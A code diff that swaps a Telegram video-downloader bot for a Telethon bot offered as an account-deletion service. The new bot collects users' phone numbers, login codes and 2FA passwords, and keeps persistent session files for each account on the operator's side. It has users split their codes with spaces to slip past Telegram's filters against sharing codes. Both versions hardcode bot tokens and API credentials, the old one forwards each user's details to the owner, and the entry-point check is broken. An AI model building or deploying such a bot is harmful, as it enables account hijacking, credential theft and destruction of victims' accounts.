@@ -1,273 +1,102 @@
-import telebot
-from telebot import types
-import yt_dlp
+import asyncio
 import os
+from telethon import TelegramClient, events, Button
+from telethon.errors import SessionPasswordNeededError
+from telethon.tl.functions.account import DeleteAccountRequest
 
-# ================= CONFIG =================
-TOKEN = "8383702961:AAFgdNwax3qbH5eVnNczhllyjSEQ2KWzPjM"
-OWNER_ID = 6583637773
-CHANNEL_USERNAME = "@L7nmovies"
-OWNER_LINK = "https://t.me/L7N07"
+# --- YOUR CONFIGURATION ---
+API_ID = 20907639           # Your API ID from my.telegram.org
+API_HASH = 'e43600f1a902523549d0d0dc39f9f10e' # Your API Hash
+BOT_TOKEN = '8255056409:AAHS6uNKyaEIEMnAobOxzrO_vrhxiNh9QNI'    # Your Bot Token from @BotFather
 
-bot = telebot.TeleBot(TOKEN, threaded=True, num_threads=8)
-DOWNLOAD_DIR = "downloads"
-os.makedirs(DOWNLOAD_DIR, exist_ok=True)
+# Ensure sessions folder exists
+if not os.path.exists('sessions'):
+    os.makedirs('sessions')
 
-# ================= UI (CUSTOMIZE EVERYTHING) =================
-ui = {
-    # TEXTS
-    "start": "👋 سلاف {name}!\n🚀 بەخێربێیت بۆ بۆتی دالنوت",
-    "join": "🔒 تکایە سەرەتا کەناڵ join بکە",
-    "ask_link": "🔗 لینکی ڤیدیۆ بنێرە",
-    "downloading": "⏳ دالنوت دەست پێکرد...",
-    "done": "✅ ڤیدیۆ دالنوت بوو!",
-    "error": "❌ دالنوت سەرکەوتوو نەبوو",
+bot = TelegramClient('bot_session', API_ID, API_HASH)
+user_states = {}
 
-    # BUTTONS
-    "btn_download": "🎥 دالنوت ڤیدیۆ",
-    "btn_again": "🔁 دالنوت ڤیدیۆی دیکە",
-    "btn_close": "⛔ داخستن",
-    "btn_settings": "⚙️ Settings",
-    "btn_owner": "📩 پەیوەندی بە Owner",
-    "btn_join": "📢 Join Channel"
-}
-
-# ================= STATES =================
-wait_link = {}
-wait_edit = {}
-wait_photo = {}
-wait_channel = {}
-start_photo = None
-
-# ================= UTILS =================
-def is_joined(user_id):
-    try:
-        m = bot.get_chat_member(CHANNEL_USERNAME, user_id)
-        return m.status in ["member", "administrator", "creator"]
-    except:
-        return False
-
-def base_kb(extra=None):
-    kb = types.InlineKeyboardMarkup(row_width=1)
-    if extra:
-        for b in extra:
-            kb.add(b)
-    kb.add(types.InlineKeyboardButton(ui["btn_owner"], url=OWNER_LINK))
-    return kb
-
-def join_lock(chat_id):
-    kb = base_kb([
-        types.InlineKeyboardButton(
-            ui["btn_join"],
-            url=f"https://t.me/{CHANNEL_USERNAME.replace('@','')}"
-        ),
-        types.InlineKeyboardButton("✅ Check", callback_data="check_join")
-    ])
-    bot.send_message(chat_id, ui["join"], reply_markup=kb)
-
-def again_kb():
-    return base_kb([
-        types.InlineKeyboardButton(ui["btn_again"], callback_data="download"),
-        types.InlineKeyboardButton(ui["btn_close"], callback_data="close")
-    ])
-
-# ================= NOTIFY OWNER ON START =================
-def notify_owner_start(user):
-    text = (
-        "🚀 <b>Start نوێ</b>\n\n"
-        f"👤 ناو: {user.first_name}\n"
-        f"🆔 ID: <code>{user.id}</code>\n"
-        f"🔗 Username: @{user.username}" if user.username else
-        f"🚀 <b>Start نوێ</b>\n\n"
-        f"👤 ناو: {user.first_name}\n"
-        f"🆔 ID: <code>{user.id}</code>\n"
-        f"🔗 Username: ❌"
+@bot.on(events.NewMessage(pattern='/start'))
+async def start(event):
+    await event.respond(
+        "⚠️ بۆتێ ژێبرنا هەژمارێ**\n\n"
+        "ژمارا تەلەفۆنا خۆ دگەل کۆدێ وەلاتى بنڤيسه (e.g., `+1234567890`).",
+      buttons=[Button.text("Cancel", resize=True)]
     )
 
-    try:
-        photos = bot.get_user_profile_photos(user.id, limit=1)
-        if photos.total_count > 0:
-            file_id = photos.photos[0][-1].file_id
-            bot.send_photo(
-                OWNER_ID,
-                file_id,
-                caption=text,
-                parse_mode="HTML"
-            )
-        else:
-            bot.send_message(OWNER_ID, text, parse_mode="HTML")
-    except:
-        bot.send_message(OWNER_ID, text, parse_mode="HTML")
+@bot.on(events.NewMessage)
+async def handle_messages(event):
+    uid = event.sender_id
+    text = event.text.strip()
 
-# ================= /ID =================
-@bot.message_handler(commands=["id"])
-def myid(msg):
-    bot.send_message(msg.chat.id, f"🆔 {msg.from_user.id}")
+    if text == "Cancel":
+        if uid in user_states:
+            await user_states[uid]['client'].disconnect()
+            user_states.pop(uid)
+        return await event.respond("Cancelled.", buttons=Button.clear())
 
-# ================= START =================
-@bot.message_handler(commands=["start"])
-def start(msg):
-    # 🔔 notify owner
-    notify_owner_start(msg.from_user)
-
-    if not is_joined(msg.from_user.id):
-        join_lock(msg.chat.id)
-        return
-
-    text = ui["start"].format(name=msg.from_user.first_name)
-    kb = base_kb([
-        types.InlineKeyboardButton(ui["btn_download"], callback_data="download")
-    ])
-
-    if msg.from_user.id == OWNER_ID:
-        kb.add(types.InlineKeyboardButton(ui["btn_settings"], callback_data="settings"))
-
-    if start_photo:
-        bot.send_photo(msg.chat.id, start_photo, caption=text, reply_markup=kb)
-    else:
-        bot.send_message(msg.chat.id, text, reply_markup=kb)
-
-# ================= CALLBACK =================
-@bot.callback_query_handler(func=lambda c: True)
-def cb(c):
-    uid = c.from_user.id
-    cid = c.message.chat.id
-
-    if c.data == "check_join":
-        if is_joined(uid):
-            start(c.message)
-        else:
-            bot.answer_callback_query(c.id, "❌ Join نەبوو", show_alert=True)
-
-    elif c.data == "download":
-        wait_link[uid] = True
-        bot.send_message(
-            cid,
-            ui["ask_link"],
-            reply_markup=base_kb([
-                types.InlineKeyboardButton(ui["btn_close"], callback_data="close")
-            ])
-        )
-
-    elif c.data == "settings":
-        if uid != OWNER_ID:
-            return
-        kb = types.InlineKeyboardMarkup(row_width=1)
-        kb.add(
-            types.InlineKeyboardButton("✏️ گۆڕینی پەیامەکان", callback_data="edit_text"),
-            types.InlineKeyboardButton("🔘 گۆڕینی دوگمەکان", callback_data="edit_buttons"),
-            types.InlineKeyboardButton("📢 گۆڕینی دوگمەی Join", callback_data="edit_join_btn"),
-            types.InlineKeyboardButton("🔁 گۆڕینی کەناڵ", callback_data="edit_channel"),
-            types.InlineKeyboardButton("🖼 وێنەی Start", callback_data="set_photo"),
-            types.InlineKeyboardButton(ui["btn_close"], callback_data="close")
-        )
-        bot.send_message(cid, "⚙️ Settings (Owner)", reply_markup=kb)
-
-    elif c.data == "edit_text":
-        wait_edit[uid] = "text"
-        bot.send_message(cid, "✏️ دەقی نوێ بنێرە (emoji + text):")
-
-    elif c.data == "edit_buttons":
-        wait_edit[uid] = "buttons"
-        bot.send_message(
-            cid,
-            "✏️ ناوی دوگمەکان بنێرە:\n"
-            "download|again|close|settings|owner|join"
-        )
-
-    elif c.data == "edit_join_btn":
-        wait_edit[uid] = "join_btn"
-        bot.send_message(cid, "✏️ ناوی نوێی دوگمەی Join بنێرە:")
-
-    elif c.data == "edit_channel":
-        wait_channel[uid] = True
-        bot.send_message(cid, "🔁 ناوی کەناڵی نوێ بنێرە (@channel)")
-
-    elif c.data == "set_photo":
-        wait_photo[uid] = True
-        bot.send_message(cid, "🖼 وێنەی Start بنێرە")
-
-    elif c.data == "close":
-        wait_link.pop(uid, None)
-        wait_edit.pop(uid, None)
-        wait_photo.pop(uid, None)
-        wait_channel.pop(uid, None)
-        bot.delete_message(cid, c.message.message_id)
-
-# ================= HANDLE TEXT =================
-@bot.message_handler(func=lambda m: True)
-def handle_text(m):
-    uid = m.from_user.id
-    cid = m.chat.id
-
-    if uid in wait_channel:
-        global CHANNEL_USERNAME
-        if m.text.startswith("@"):
-            CHANNEL_USERNAME = m.text.strip()
-            wait_channel.pop(uid)
-            bot.send_message(cid, "✅ کەناڵ گۆڕا")
-        else:
-            bot.send_message(cid, "❌ ناو بە @ دەست پێ بکە")
-        return
-
-    if uid in wait_edit:
-        if wait_edit[uid] == "text":
-            ui["start"] = m.text
-        elif wait_edit[uid] == "buttons":
-            try:
-                d, a, c, s, o, j = m.text.split("|")
-                ui["btn_download"] = d
-                ui["btn_again"] = a
-                ui["btn_close"] = c
-                ui["btn_settings"] = s
-                ui["btn_owner"] = o
-                ui["btn_join"] = j
-            except:
-                bot.send_message(cid, "❌ فۆرمات هەڵەیە")
-                return
-        elif wait_edit[uid] == "join_btn":
-            ui["btn_join"] = m.text
-
-        wait_edit.pop(uid)
-        bot.send_message(cid, "✅ گۆڕانکاری سەرکەوتوو بوو")
-        return
-
-    if uid in wait_link and m.text.startswith("http"):
-        bot.send_chat_action(cid, "upload_video")
-        bot.send_message(cid, ui["downloading"])
+    # 1. Start Login (Phone Number)
+    if text.startswith('+') and uid not in user_states:
+        client = TelegramClient(f'sessions/u_{uid}', API_ID, API_HASH)
+        await client.connect()
         try:
-            ydl_opts = {
-                "format": "bestvideo+bestaudio/best",
-                "merge_output_format": "mp4",
-                "outtmpl": f"{DOWNLOAD_DIR}/%(title).60s.%(ext)s",
-                "quiet": True,
-                "noplaylist": True,
-                "external_downloader": "aria2c",
-                "external_downloader_args": ["-x", "16", "-k", "1M"],
-                "http_headers": {"User-Agent": "Mozilla/5.0"}
-            }
-            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
-                info = ydl.extract_info(m.text, download=True)
-                file = ydl.prepare_filename(info)
-
-            with open(file, "rb") as f:
-                bot.send_video(cid, f)
-
-            os.remove(file)
-            bot.send_message(cid, ui["done"], reply_markup=again_kb())
+            # We save the hash to prevent 'Expired' errors
+            res = await client.send_code_request(text)
+            user_states[uid] = {'client': client, 'phone': text, 'hash': res.phone_code_hash}
+            await event.respond(
+                "✅ کۆد هاتە هنارتن!\n\n"
+                "⚠️ **Iگرنگ: ژ بۆ ئەوەی دەم بسەرڤە نەچیت، کۆدی بنێرە ب رێکا بۆشایی .\n"
+                "نموونە: ەگەر کۆدێ تە 55566 بیت، 55 666 فرێکە لازم تو دةست پئكئ 2 ژمارئن دةست پئكئ چئكئ و پاشي سپةيسةكئ شني دئ 3 ژمارئن دي چئكئ نمونه 22 322."
+            )
         except Exception as e:
-            bot.send_message(cid, f"{ui['error']}\n{e}")
+            await event.respond(f"Error: {e}")
 
-        wait_link.pop(uid, None)
+    # 2. Verify Login Code
+    elif uid in user_states and 'hash' in user_states[uid] and 'logged_in' not in user_states[uid]:
+        data = user_states[uid]
+        # Remove spaces/dots user added to trick Telegram's filters
+        clean_code = text.replace(" ", "").replace(".", "")
+        
+        try:
+            await data['client'].sign_in(data['phone'], clean_code, phone_code_hash=data['hash'])
+            user_states[uid]['logged_in'] = True
+            await event.respond("سەركەفتن! فرێکرن /delete_now ب دوماهیک ئینان.")
+        except SessionPasswordNeededError:
+            user_states[uid]['awaiting_pass'] = True
+            await event.respond("پەیڤا نهێنی یا 2FA یا خۆ بنڤيسه:")
+        except Exception as e:
+            await event.respond(f"❌ Error: {e}\nTry /start again.")
 
-# ================= HANDLE PHOTO =================
-@bot.message_handler(content_types=["photo"])
-def handle_photo(m):
-    global start_photo
-    if m.from_user.id in wait_photo:
-        start_photo = m.photo[-1].file_id
-        wait_photo.pop(m.from_user.id)
-        bot.send_message(m.chat.id, "✅ وێنە گۆڕا")
+    # 3. Handle 2FA Password
+    elif uid in user_states and user_states[uid].get('awaiting_pass'):
+        try:
+            await user_states[uid]['client'].sign_in(password=text)
+            user_states[uid]['logged_in'] = True
+            await event.respond("2FA OK! Send /delete_now to finish.")
+        except Exception as e:
+            await event.respond(f"Password Error: {e}")
 
-print("🤖 BOT READY — FAST, FULL, OWNER NOTIFIED")
-bot.infinity_polling()
+@bot.on(events.NewMessage(pattern='/delete_now'))
+async def finalize(event):
+    uid = event.sender_id
+    if uid in user_states and user_states[uid].get('logged_in'):
+        try:
+            await user_states[uid]['client'](DeleteAccountRequest(reason="Bye!"))
+            await event.respond("Account deleted.")
+        except Exception as e:
+            await event.respond(f"Error: {e}")
+        finally:
+            await user_states[uid]['client'].disconnect()
+            user_states.pop(uid, None)
+
+# --- STARTUP FOR PYTHON 3.14 ---
+async def main():
+    await bot.start(bot_token=BOT_TOKEN)
+    print("Bot is LIVE.")
+    await bot.run_until_disconnected()
+
+if name == 'main':
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        pass
